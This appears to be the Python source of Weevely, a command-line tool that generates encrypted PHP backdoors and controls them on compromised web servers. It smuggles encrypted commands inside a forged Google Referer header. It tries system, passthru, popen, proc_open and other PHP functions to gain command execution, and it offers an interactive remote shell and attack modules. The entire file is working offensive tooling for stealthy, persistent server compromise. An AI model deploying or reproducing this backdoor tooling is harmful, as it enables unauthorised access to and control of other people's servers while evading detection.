#!/usr/bin/env python
# -*- coding: utf-8 -*-

from numpy import frombuffer, bitwise_xor, byte
import getopt, sys, base64, os, urllib2, re, urlparse, os
    
def crypt(text, key):
  text = frombuffer( text, dtype=byte )
  firstpad=frombuffer(( key*(len(text)/len(key)) + key)[:len(text)], dtype=byte)
  strrepeat=frombuffer( '\x1f'*len(text), dtype=byte)
  strrepeat2=frombuffer( '\xe0'*len(text), dtype=byte)
  
  bit=((text ^ firstpad) & strrepeat ) | ( text & strrepeat2 )
  
  toret = base64.b64encode(bit.tostring())
  return toret     
    
class weevely:
  
  modules = {}
  
  def main(self):
    
    self.banner()
    self.loadmodules()
  
    try:
	opts, args = getopt.getopt(sys.argv[1:], 'ltgm:c:u:p:o:e:', ['list', 'module', 'generate', 'url', 'password', 'terminal', 'command', 'output', 'escape'])
    except getopt.error, msg:
	print "Error:", msg
	exit(2)
    
    for o, a in opts:
	if o in ("-g", "-generate"):
	  moderun='g'
	if o in ("-t", "-terminal"):
	  moderun='t'
	if o in ("-l", "-list"):
	  moderun='l'
	if o in ("-c", "-command"):
	  cmnd=a
	  moderun='c'
	if o in ("-m", "-module"):
	  modul=a
	  moderun='m'
	if o in ("-e", "-escape"):
	  if(int(a)%1==0):
	    escape=int(a)
	  else:
	    print "- Error: escape method is not a valid integer"
	    sys.exit(1)
	  
	if o in ("-u", "-url"):
	  url=a
	  parsed=urlparse.urlparse(url)
	  if not parsed.scheme:
	    url="http://"+url
	  if not parsed.netloc:
	    print "- Error: URL not valid"
	    sys.exit(1)
	  
	if o in ("-p", "-password"):
	  if len(a)<4:
	    print "- Error: required almost 4 character long password"
	    sys.exit(1)
	  pwd=a
	if o in ("-o", "-output"):
	  outfile=a

    # Start
    if 'moderun' in locals():
  
      if moderun=='c' or moderun=='t' or moderun=='m':
	
	if 'url' not in locals():
	  print "! Please specify URL (-u)"
	  sys.exit(1)
	  
	if('escape') not in locals():
	  escape=-1;
	  
	#self.host=host(url,pwd,escape)
	try:
	  self.host=host(url,pwd,escape)
	except Exception, e:
	  print "! Error: " + str(e) + ". Exiting."
	  sys.exit(1)
	  

      if moderun=='g':
	if 'outfile' not in locals():
	  print "! Please specify where generate backdoor file (-o)"
	  sys.exit(1)

      if 'pwd' not in locals() and moderun!='l':
	  
	pwd=''
	while not pwd or len(pwd)<4:
	  print "+ Please insert almost 4 character long password : ",
	  pwd = sys.stdin.readline().strip()

      if moderun=='c':       
	try:
	  print self.host.execute(cmnd)
	except Exception, e:
	  #print '! Command execution failed: ' + str(e) + '.'
	  raise
	return

      if moderun=='t':
	self.terminal(url,pwd)
      if moderun=='g':
	self.generate(pwd,outfile)
      if moderun=='m':
	self.execmodule(url,pwd,modul,os)
      if moderun=='l':
	self.listmodules()
    else:
      self.usage()
      sys.exit(1)

  def usage(self):
    print """+ Generate backdoor crypted code.
+  	./weevely -g -o <filepath> -p <password>
+      
+ Execute shell command.
+  	./weevely -c <command> -u <url> -p <password>
+      
+ Start terminal session.
+  	./weevely -t -u <url> -p <password>
+
+ List plugins modules (available: """ + ", ".join(self.modules) + """).
+  	./weevely -l
+
+ Execute plugin on remote server using arguments.
+  	./weevely -m <module>::<firstarg>::..::<Narg> -u <url> -p <password>"""
    
  def banner(self):
    print "+ Weevely - Generate and manage stealth PHP backdoors.\n+"

    
  def terminal(self, url, pwd):
    
    hostname=urlparse.urlparse(url)[1]
    
    while True:
      print hostname + '> ',
      cmnd = sys.stdin.readline()
      if cmnd!='\n':
	print self.host.execute(cmnd)

  def generate(self,key,path):
    f_tocrypt = file('php/encoded_backdoor.php')
    f_back = file('php/backdoor.php')
    f_output = file(path,'w')
    
    str_tocrypt = f_tocrypt.read()
    new_str_tocrypt = str_tocrypt.replace('%%%START_KEY%%%',key[:2]).replace('%%%END_KEY%%%',key[2:]).replace('\n','')
    str_crypted = crypt(new_str_tocrypt,key[2:])
    str_back = f_back.read()
    new_str = str_back.replace('%%%BACK_CRYPTED%%%', str_crypted).replace('%%%START_KEY%%%',key[:2]).replace('%%%END_KEY%%%',key[2:]).replace('\n','')
    
    f_output.write(new_str)
    print '+ Backdoor file ' + path + ' created with password '+ key + '.'

  def execmodule(self, url, pwd, modulestring, os):
    
    modname = modulestring.split('::')[0]
    modargs = modulestring.split('::')[1:]
    
    if not self.modules.has_key(modname):
      print '! Module', modname, 'doesn\'t exist. Print list (-l).'
    else:
      m = self.modules[modname]
      if m.has_key('arguments'):
	argnum=len(self.modules[modname]['arguments'])
	if len(modargs)!=argnum:
	  print '! Module', modname, 'takes exactly', argnum, 'argument/s:', ','.join(self.modules[modname]['arguments'])
	  print '! Description:', self.modules[modname]['description']
	  return
       
      if m.has_key('os'):
	if self.host.os not in self.modules[modname]['os']:
	  print '- Warning: remote system \'' + self.host.os + '\' and module supported system/s \'' + ','.join(self.modules[modname]['os']).strip() + '\' seems not compatible.'
	  print '- Press enter to continue or control-c to exit'
	  sys.stdin.readline()
	
      f = file('modules/' + modname + '.php')
      modargsstring='"'+'","'.join(modargs) + '"'
      modutext = '$ar = Array(' + modargsstring + ');\n' + f.read()
      
      toinject=''
      for i in modutext.split('\n'):
	if len(i)>2 and ( i[:2] == '//' or i[0] == '#'):
	  continue
	toinject=toinject+i+'\n'
      
      try:
	ret = self.host.execute_php(toinject)
      except Exception, e:
	#print '! Module execution failed: ' + str(e) + '.'
	raise
      else:
	print ret
    
   
  def listmodules(self):
    
    for n in self.modules.keys():
      m = self.modules[n]
      
      print '+ Module:', m['name']
      if m.has_key('OS'):
	print '+ Supported OSs:', m['OS']
      
      if m.has_key('arguments'):
	print '+ Usage: ./weevely -m ' + m['name'] + "::<" + '>::<'.join(m['arguments']) + '>' + ' -u <url> -p <password>'
      else:
	print '+ Usage: ./weevely -m ' + m['name'] + ' -u <url> -p <password>'
	
      if m.has_key('description'):
	print '+ Description:', m['description'].strip()

      print '+'
  
  def loadmodules(self):
    files = os.listdir('modules')
    
    for f in files:
      module={}
      
      if f.endswith('.php'):
	
	  
	mod = file('modules/' + f)
	modstr = mod.read()
	modname = f[:-4]
	module['name']=modname
	
	restring='//.*Author:(.*)'
	e = re.compile(restring)
	founded=e.findall(modstr)
	if founded:
	  module['author']=founded[0]

	restring='//.*Description:(.*)'
	e = re.compile(restring)
	founded=e.findall(modstr)
	if founded:
	  module['description']=founded[0]
	  
	restring='//.*Arguments:(.*)'
	e = re.compile(restring)
	founded=e.findall(modstr)
	if founded:
	  module['arguments'] = [v.strip() for v in founded[0].split(',')]

	restring='//.*OS:(.*)'
	e = re.compile(restring)
	founded=e.findall(modstr)
	if founded:
	  module['os'] = [v.strip() for v in founded[0].split(',')]

	self.modules[module['name']]=module
     
    
class host():
  
  
  def __init__(self,url,pwd,escape):
    self.url=url
    self.pwd=pwd
    
    (os, method) = self.checkbackdoor(escape)
    
    self.method=method
    self.os=os

  def checkbackdoor(self, escape):
    
    os = None
    e = Exception("Escape method number " + str(escape) + " not works. Maybe remote function is unsupported, or url or password are wrong")
    
    print '+ Testing backdoor with functions.. ',
    if escape == -1 or escape==0:
      # Eval test + OS check
      try:
	os = self.execute_php("echo PHP_OS;")
      except Exception, e:
	print 'eval() system() ',
	
      # System() test
      try:
	ret = self.execute_php("@system('echo " + self.pwd + " 2>&1');")
      except Exception, e:
	pass
      else:
	if self.pwd == ret:
	  return os, 0

    if escape == -1 or escape==1:
      # Passthru() test
      print 'passthru() ',
      try:
	ret = self.execute_php("@passthru('echo " + self.pwd + " 2>&1');")
      except Exception, e:
	pass
      else:
	if self.pwd == ret:
	  return os, 1

    if escape == -1 or escape==2:
      # pcntl_exec() test
      print 'pcntl_exec() ',
      try:
	ret = self.execute_php("$u = Array('" + self.pwd + "'); @pcntl_exec('/bin/echo', $u);")
      except Exception, e:
	pass
      else:
	if self.pwd == ret:
	  return os, 2  
      
    if escape == -1 or escape==3:
      # popen() test
      print 'popen() ',
      try:
	ret = self.execute_php("$h=popen('echo " + self.pwd + " 2>&1', 'r'); while(!feof($h)) { echo fread($h, 2096); } pclose($h);")
      except Exception, e:
	pass
      else:
	if self.pwd == ret:
	  return os, 3
      
    if escape == -1 or escape ==4:
      # exec() test
      # <?php exec('echo CULO',$o); $re = join('rn', $o); echo $re; ?>
      print 'exec() ',
      try:
	ret = self.execute_php("@exec('echo " + self.pwd + " 2>&1', $o); $r = join('rn', $o); echo $r;")
      except Exception, e:
	pass
      else:
	if self.pwd == ret:
	  return os, 4
      
      
    if escape == -1 or escape ==5:
      # shell_exec() test
      print 'exec_shell() ',
      try:
	ret = self.execute_php("@shell_exec('echo " + self.pwd + " 2>&1');")
      except Exception, e:
	pass
      else:
	if self.pwd == ret:
	  return os, 5
      
    if escape == -1 or escape == 6:
      # perl extension test
      print 'perl->eval() ',
      try:
	ret = self.execute_php("$perl = new perl(); $r = @perl->system('echo " + self.pwd + " 2>&1'); echo $r")
      except Exception, e:
	pass
      else:
	if self.pwd == ret:
	  return os, 6
    
    if escape == -1 or escape == 7:
      # python extension test
      print 'python_eval() ',
      try:
	ret = self.execute_php("@python_eval('import os; os.system('echo " + self.pwd + " 2>&1');")
      except Exception, e:
	pass
      else:
	if self.pwd == ret:
	  return os, 7
      
    if escape == -1 or escape == 8:
      # proc_open() test
      #<?php 
      #$p = array(array('pipe', 'r'), array('pipe', 'w'), array('pipe', 'w')); 
      #$h = proc_open('echo CULO', $p, $pipes);
      #$r = stream_get_contents ($pipes[1]); $r .= stream_get_contents ($pipes[2]);
      #fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($h);
      #echo $r;
      #?>
      tosend = "array(array('pipe', 'r'), array('pipe', 'w'), array('pipe', 'w')); $h = proc_open('echo " + self.pwd + "', $p, $pipes);"
      tosend += "$r = stream_get_contents ($pipes[1]); $r .= stream_get_contents ($pipes[2]); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($h); echo $r;"
      print 'proc_open()'
      try:
	ret = self.execute_php(tosend)
      except Exception, e:
	pass
      else:
	if self.pwd == ret:
	  return os, 8
      
    raise e;
    
    
  def execute_php(self,cmnd):
    
    cmnd=cmnd.strip()
    cmdstr=crypt(cmnd,self.pwd[2:])
    
    
    # http://www.google.com/url?sa=t&source=web&ct=res&cd=7&url=http%3A%2F%2Fwww.example.com%2Fmypage.htm&ei=0SjdSa-1N5O8M_qW8dQN&rct=j&q=flowers&usg=AFQjCNHJXSUh7Vw7oubPaO3tZOzz-F-u_w&sig2=X8uCFh6IoPtnwmvGMULQfw
    refurl='http://www.google.com/url?sa=' + self.pwd[:2] + '&source=' + cmdstr[:len(cmdstr)/2] + '&ei=' + cmdstr[(len(cmdstr)/2):]
    
    try: 
      ret=self.execHTTPGet(refurl)
    
    except urllib2.URLError, e:
      raise
    else: 
      restring='<' + self.pwd[2:] + '>(.*)</' + self.pwd[2:] + '>'
      e = re.compile(restring,re.DOTALL)
      founded=e.findall(ret)
      if len(founded)<1:
	raise Exception('No valid responses, check password or url')
      else:
	return founded[0].strip()

  
  def execute(self, cmnd):
    
    if(self.method==0):
      cmnd="@system('" + cmnd + " 2>&1');"
    elif(self.method==1):
      cmnd="@passthru('" + cmnd + " 2>&1');"
    elif(self.method==2):
      cmnd="$u = Array('" + cmnd[1:] + "'); @pcntl_exec('" + cmnd[0] + "', $u);"
    elif(self.method==3):
      cmnd="$h=popen('" + cmnd + "', 'r'); while(!feof($h)) { echo fread($h, 2096); } pclose($h);"
    elif(self.method==4):
      cmnd="@exec('" + cmnd + " 2>&1', $o); $r = join('rn', $o); echo $r;"
    elif(self.method==5):
      cmnd="@shell_exec('" + cmnd + " 2>&1');"
    elif(self.method==6):
      cmnd="$perl = new perl(); $r = @perl->system('" + cmnd + " 2>&1'); echo $r"
    elif(self.method==7):
      cmnd="@python_eval('import os; os.system('" + cmnd + " 2>&1');"
    elif(self.method==8):
      cmnd = "array(array('pipe', 'r'), array('pipe', 'w'), array('pipe', 'w')); $h = proc_open('" + cmnd + "', $p, $pipes);"
      cmnd += "$r = stream_get_contents ($pipes[1]); $r .= stream_get_contents ($pipes[2]); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($h); echo $r;"
    
    return self.execute_php(cmnd)
    
    
  def execHTTPGet(self, refurl):
    req = urllib2.Request(self.url)
    req.add_header('Referer', refurl)
    r = urllib2.urlopen(req)
    return r.read()    
  
  def genUserAgent(self):
    winXP='Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6'
    ubu='Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.14) Gecko/2009090216 Ubuntu/9.04 (jaunty) Firefox/3.0.14'
    msie='Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; GTB5; InfoPath.1)'
    
  def genRefUrl(self,cmndstr):
    
    pwd=self.pwd
    
    mindistance='2083'
    minr=''
    
    for r in refurls:
      
      url=urlparse.urlparse(r)
      params=url[4]
      keys = [part.split('=')[0] for part in params.split('&')] #params.keys()
      values = [part.split('=')[1] for part in params.split('&')]

      
      distance =  []
      newparams = ''
    
      if len(keys) != 3:
	continue
      
      newparams = keys[0] + '=' + self.pwd + '&'
      distance.append(abs(len(values[0]) - len(self.pwd))) # pwd_distance
      
      newparams += keys[1] + '=' + cmndstr + '&'
      distance.append(abs(len(values[1]) - len(cmndstr)))
      
    
    
      newurl = url.geturl().replace(params,newparams)
      
      absdistance=0
      for i in distance:
	absdistance+=i
      
      if absdistance<mindistance:
	mindistance=absdistance
	minr=r
   
    #print '+ HTTP_REFERER fake header [' + str(refurls.index(minr)) + '] contains ' + str(absdistance) + ' characters more than real one.'
    
    
if __name__ == "__main__":
    
    
    app=weevely()
    try:
      app.main()
    except KeyboardInterrupt:
      print '\n! Received keyboard interrupt, exiting.'
      
      
    
    
   